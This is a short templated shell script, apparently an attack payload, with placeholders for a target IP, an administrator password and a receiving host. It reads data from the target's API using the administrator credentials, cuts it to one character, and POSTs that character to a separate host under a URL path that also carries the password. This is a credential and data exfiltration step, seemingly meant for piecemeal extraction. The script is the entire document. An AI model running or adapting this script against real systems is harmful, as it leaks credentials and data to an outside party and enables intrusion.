#!/bin/sh
curl -s administrator:{{password_ditto}}@{ip_ditto}/api/2/search/things | cut -c1-1 | curl -X POST -H 'Content-Type: text/plain' -d @- {this_ip}/credential_ditto/{{password_ditto}}